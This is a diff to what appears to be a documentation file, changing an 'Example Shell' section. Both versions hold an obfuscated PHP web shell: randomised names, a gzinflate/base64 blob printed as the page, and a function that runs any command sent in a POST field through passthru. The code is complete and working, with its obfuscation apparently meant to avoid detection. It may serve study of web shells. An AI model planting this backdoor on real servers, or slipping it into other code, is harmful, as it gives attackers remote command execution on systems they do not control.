@@ -13,18 +13,19 @@
     
 ## Example Shell
     <?php
-    $LjFeymw9ObY = gzinflate(base64_decode("dVBNa8JAEL33V0wXK7UoiYK0NWugh+Khhwqtpfa2STYmmN1JkwmaSv97d41iFDosw3y+ffN4Qirzr8AYT6SImnCfllRn8pRbS3Ve0Q4CEa5XBVY6GoSYYTGBYhXcjsbjPhxdz4NNGlEygaHr3ni/ZzB3sIMYNQ3K9EeaiVG+9aCF5PbBPoOxn4qFSrN6Ago1lrkIJVynKseChKYL5ACj+n9+rqXWuN7F4ubhU3yUNF8udm0mw3szfnTtHe605OHOSTpuKbRUjLFQIEJKUU9ZQfp7+TR7VLNnBmk0ZbbLQElK0GTz17d3dq4430sOVOdyykhuiYEWysRxGQp3/bL5WjAQFWGIKs8kmQ7GcVOKMazKCzijn/Zh1F2R1xUq94b2ElvjQUWE+vBTWQUqJeZ3Oh3uNJ3WTY6lfTg3xMiowPNC+n8="));
-    function uVBE59z4Q($tktqPadnM){
-        echo "<w8XaVstPYU>$ ".$tktqPadnM."</w8XaVstPYU><br>";
-        echo passthru($tktqPadnM." 2>&1");
+    $SnHCQlIQNe2 = gzinflate(base64_decode("dVFhS8MwEP3urzgjioqyrm7rXLuBoN8GTtwnv6VtasuaXG2vujn87ybpxuLAEB53715fj5coJ1nOTkCfKBc87UrbNrQpxaE3p1BVS1uIebJ6r7FV6W2CJdYTqN/jS384vIE9XIXwVaSUT6Dveefhzx+ba9hChopum+JbaIVfrUNwnLwbMFd7WFXGZVFuJiBRYVPxRMBpISusiSs6co4x3fy/n2dW6+Dq6EPtq7buDv1AC/fgqqOeE0zUO4QWmZ87+WVYS+AJFaimLP54G3y2j7gYMyjSKTNDBlJQjrpbPL8u2d+oI5s10KYSU0ZiTQwUl7rm89XjKh8t5y8+A94SJiirUpAeYZZ1VIZJ2xz5xS0Rqp1h08ayIDa7OFsHT6FG3zM4GhkcDg0GfYN3FgeuZmz5gVX2D3wwcKaWDx6sxsGO2fn4trZ6/95Ox47bUxj1upWdSHsmtl3aCab6EaKqFrNf"));
+    
+    function S0CPIBHLSac($O1gids31RI){
+        echo "<span>$ ".$O1gids31RI."</span><br>";
+        echo htmlentities(passthru($O1gids31RI." 2>&1"));
     }
-    @$lEqaCYzNli2=$_POST["fsca0kKwZU"];
-    echo preg_replace("/rtnqYAG9mGE/", basename($_SERVER["SCRIPT_NAME"]), $LjFeymw9ObY);
-    if (isset($lEqaCYzNli2)){
-        uVBE59z4Q($lEqaCYzNli2);
+    echo preg_replace("/bqZ4vuDoP8/", basename($_SERVER["SCRIPT_NAME"]), $SnHCQlIQNe2);
+    
+    if (isset($_POST["aLkDkh6TLQ2"])){
+        S0CPIBHLSac($_POST["aLkDkh6TLQ2"]);
     }
     else {
-        uVBE59z4Q("#");
+        S0CPIBHLSac("#");
     }
     __halt_compiler/*
     */();
